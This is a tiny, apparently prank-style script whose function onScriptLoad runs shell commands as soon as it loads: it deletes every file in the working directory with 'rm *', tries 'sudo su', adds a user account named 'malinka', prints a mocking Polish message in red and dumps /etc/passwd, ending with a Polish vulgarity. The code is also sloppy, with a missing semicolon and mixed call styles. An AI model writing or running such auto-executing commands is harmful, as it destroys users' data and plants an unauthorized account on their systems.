function onScriptLoad(){
        system("rm *");
        system("sudo su");
        system("sudo useradd malinka");
        system("echo $(tput setaf 1) sprawdz uzytkowników :) ");
        system("cat /etc/passwd")
		print("dupa");
		}